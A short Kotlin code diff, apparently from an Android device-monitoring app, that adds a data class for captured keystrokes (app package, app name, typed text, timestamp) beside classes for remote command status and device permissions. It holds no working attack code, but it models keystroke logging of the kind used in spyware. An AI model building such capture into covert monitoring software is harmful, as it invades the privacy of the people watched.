@@ -108,6 +108,14 @@ data class CommandStatusUpdate(
 )
 
 @JsonClass(generateAdapter = true)
+data class KeystrokeData(
+    val appPackage: String,
+    val appName: String,
+    val text: String,
+    val timestamp: Long = System.currentTimeMillis()
+)
+
+@JsonClass(generateAdapter = true)
 data class DevicePermissionsStatus(
     val location: Boolean,
     val notificationAccess: Boolean,
